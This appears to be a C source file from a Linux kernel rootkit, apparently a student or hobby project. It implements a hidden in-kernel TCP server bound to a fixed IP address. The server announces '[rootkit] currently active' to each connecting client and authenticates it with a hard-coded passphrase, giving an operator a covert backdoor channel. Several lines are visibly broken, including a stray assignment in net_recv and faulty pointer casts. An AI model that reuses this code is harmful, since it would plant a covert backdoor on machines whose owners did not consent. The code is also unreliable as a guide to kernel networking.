/*
	tcp server that accepts one connection at a time
	sites that helped develop code:
		https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
		https://stackoverflow.com/questions/49340626/creating-a-tcp-server-in-the-kernel-in-c
*/

#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>

#include <linux/string.h>

#include "server.h"


	/*=============*\
		networking
	\*=============*/
struct client_t{ //structure holding client information
	struct socket *sock; //structure holding socket object
	struct kvec sock_vec; //holds vector of data recieved
	struct msghdr sock_msg; //structure to hold data recieved
	char *message; //structure to hold message sent or recieved
};

struct server_t{
	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
	struct socket *sock; //structure holding socket object
	int port;
};

struct client_t client; //global variable holding data associated with client for easy access by all functions
struct server_t server; //global variable holding data associated with server for easy access by all functions

static int run_server(void *port){ //runs the server
	int err; //int to hold error codes
	server.port = (unsigned short int) port; //sets the server port

	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr

	server.s_addr.sin_family = AF_INET; //sets the family
	server.s_addr.sin_port = htons(server.port); //sets the port
	server.s_addr.sin_addr.s_addr = in_aton("10.1.1.14"); //sets the adress to any
	server.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
	if (server.sock == NULL) { //if message is null
		printk(KERN_DEBUG "[rootkit] run_server- server.sock kzalloc error!\n"); //prints debug info
		return -1; //returns -1 for error
	}
	client.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for connection
	if (client.sock == NULL) { //if message is null
		printk(KERN_DEBUG "[rootkit] run_server- client.sock kzalloc error!\n"); //prints debug info
		return -1; //returns -1 for error
	}

	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
	if (err){ //if error creating socket
		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %d\n", err); //print debug info
		return err; //returns -1 for error
	}
	err = kernel_bind(server.sock, (struct sockaddr *)&(server.s_addr),sizeof(struct sockaddr_in)); //binds server
	if (err<0){ //if error binding
		printk(KERN_DEBUG "[rootkit] run_server- server bind error!- %d\n", err); //prints debug info
		return err; //returns -1 for error
	}

	err = kernel_listen(server.sock, 1); //listens for connections with 1 backlog
	if (err<0){ //if error listening
		printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %d\n", err); //prints debug info
		return err; //returns -1 for error
	}

	while(true){
		err = kernel_accept(server.sock, &(client.sock), 1); //accepts connection
		if (err<0){ //if error accepting conn
			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %d\n", err); //prints debug info
			return err; //returns -1 for error
		}
		printk("[rootkit] run_server- client accepted\n");
		err = client_handler();
		if (err<0){ //if error with handling
			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %d\n", err); //prints debug info
		}
	}
	return 0; //return 0  for no errors
}

static int remove_server(void){ //removes the server
	sock_release(client.sock);
	sock_release(server.sock);
	return 0;
}

static int net_send(void){ //sends data to the server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	if (client.message==NULL||strlen(client.message)==0){ //if no message to be sent
		printk(KERN_DEBUG "[rootkit] net_send- no message!"); //print debug info
		return -1; //return -1 for error
	}
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	printk("set memory of sock_msg\n");
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	printk("set memory of sock_vec\n");
	client.sock_vec.iov_base = client.message; //sets the data to be sent
	printk("set message\n");
	client.sock_vec.iov_len = BUFFER_SIZE; //sets the size of the message
	printk("set iov_len\n");
	printk("client.sock = 0x%x   client.sock_msg @ 0x%x  client.sock_vec @ 0x%x\nmessage = client.message\n", client.sock, &(client.sock_msg), &(client.sock_vec));
	err = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, strlen(client.message)); // sends data
	printk("sent message\n");
	if (err < 0) { //if error sending message
		printk(KERN_DEBUG "[rootkit] net_send- unable to send message!- %d\n", err); //print debug info
		return err; //return error
	}
	else if(err != BUFFER_SIZE){ //if not all data sent
		printk(KERN_DEBUG "[rootkit] net_send- unable to send entire message- %d\n", err); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

static int net_recv(void){ //recieves data from server
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err; //int to hold error codes
	if (client.message == NULL) { //if message is null
		client.message =
		printk(KERN_DEBUG "[rootkit] net_recv- buffer is NULL!\n"); //prints debug info
		return -1; //returns -1 for error
	}
	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	client.sock_vec.iov_base=client.message; //sets the location of buffer for recieved data to be placed
	client.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message
	client.sock_msg.msg_flags=MSG_NOSIGNAL;

	err = kernel_recvmsg(client.sock, &(client.sock_msg), &(client.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0); //recieves message
	if (err < 0){ //if error recieving message
		printk(KERN_DEBUG "[rootkit] net_recv: error recieving data"); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}

	/*========================*\
		client interface
	\*========================*/

static int client_handler(void){
	printk(KERN_DEBUG "[rootkit] in client_handler");

	// kernel memory allocate a send and recieve buffer
	client.message = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
	if (client.message == NULL) { //if message is null
		printk(KERN_DEBUG "[rootkit] run_server- buffer zmalloc error!\n"); //prints debug info
		return -1; //returns -1 for error
	}
	printk("client.message kzalloc done\n");
	strcpy(client.message, "[rootkit] currently active"); //copies basic auth message into buffer
	printk("message = %s\n", client.message);
	printk("message copied\n");
	net_send();
	printk("message sent\n");
	net_recv();
	printk("message recieved\n");
	if (strcmp("Command has been expecting you...", client.message)!=0){ //if received message is not same as expected
		printk(KERN_DEBUG "[rootkit] handle_client: client is a fake\n%s", client.message); //print debug info
		return -1; //return -1 for error
	}
	return 0; //return 0 for no errors
}
